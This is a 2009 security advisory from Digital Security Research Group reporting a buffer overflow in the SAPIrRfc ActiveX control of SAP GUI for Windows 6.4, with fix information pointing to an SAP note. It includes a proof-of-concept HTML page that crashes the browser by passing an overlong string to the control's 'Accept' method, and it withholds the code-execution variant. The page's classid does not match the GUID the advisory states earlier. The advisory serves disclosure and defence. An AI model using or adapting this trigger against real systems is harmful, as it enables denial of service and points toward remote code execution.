@@ -1,0 +1,79 @@
+Digital Security Research Group [DSecRG] Advisory      #DSECRG-09-015
+
+Original Advisory:   http://dsecrg.com/pages/vul/show.php?id=115
+
+
+Application:                    SAP GUI for Windows,  EnjoySAP
+Versions Affected:              Version 6.4 
+Vendor URL:                     http://SAP.com
+Bugs:                           Buffer Overflow
+Exploits:                       YES
+Reported:                       13.11.2008
+Vendor response:                17.11.2008
+Date of Public Advisory:        08.06.2009
+CVE-number:                     
+Author:                         Alexander Polyakov
+                                Digital Security Research Group [DSecRG] (research [at] dsec [dot] ru)
+
+
+
+Description
+***********
+
+SAP GUI for Windows version 6.4 contains ActiveX component SAPIrRfc  which is vulnerable to Buffer overflow attack.    
+
+file = sapirrfc.dll
+GUID = F6908F83-ADA6-11D0-87AA-00AA00198702
+
+
+Details
+*******
+
+Attacker can construct html page which will call vulnerable function "Accept" from ActiveX Object SAPIrRfc with long parameter.
+When user open this vulnerable page it will occur DOS (Example 1) or full remote control on target system (Example2 execute calc.exe aviable by request) .
+
+
+
+Example1:
+*********
+
+
+<html>
+<object classid='clsid:77F12F8A-F117-11D0-8CF1-00A0C91D9D87' id='target' />
+<script>
+
+arg1="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+
+target.Accept arg1 
+
+</script>
+</html>
+
+
+
+Fix Information
+***************
+The issue has been solved. See SAP note 1286637.
+
+
+
+References:
+***********
+SAP note 1286637
+
+https://service.sap.com/sap/support/notes/1286637
+http://dsecrg.com/pages/vul/show.php?id=115
+
+
+
+
+About
+*****
+
+Digital Security is one of the leading IT security companies in CEMEA, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards. Digital Security Research Group focuses on application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.
+
+
+Contact:        research [at] dsecrg [dot] com
+                http://www.dsecrg.com
+
+# milw0rm.com [2009-06-08]
